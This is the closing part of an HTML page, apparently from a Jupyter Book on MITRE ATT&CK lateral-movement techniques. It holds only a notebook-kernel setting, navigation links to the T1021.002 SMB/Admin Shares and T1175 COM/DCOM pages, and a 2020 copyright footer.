            kernelName: ".net-powershell",
            path: "./tactics/lateral-movement"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = '.net-powershell'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="T1021.002.html" title="previous page">T1021.002 - Remote Services: SMB/Windows Admin Shares</a>
    <a class='right-next' id="next-link" href="T1175.html" title="next page">T1175 - Component Object Model and Distributed COM</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Hare Sudhan Muthusamy<br/>
        
            &copy; Copyright 2020.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    <script src="../../_static/js/index.js"></script>
    
  </body>
</html>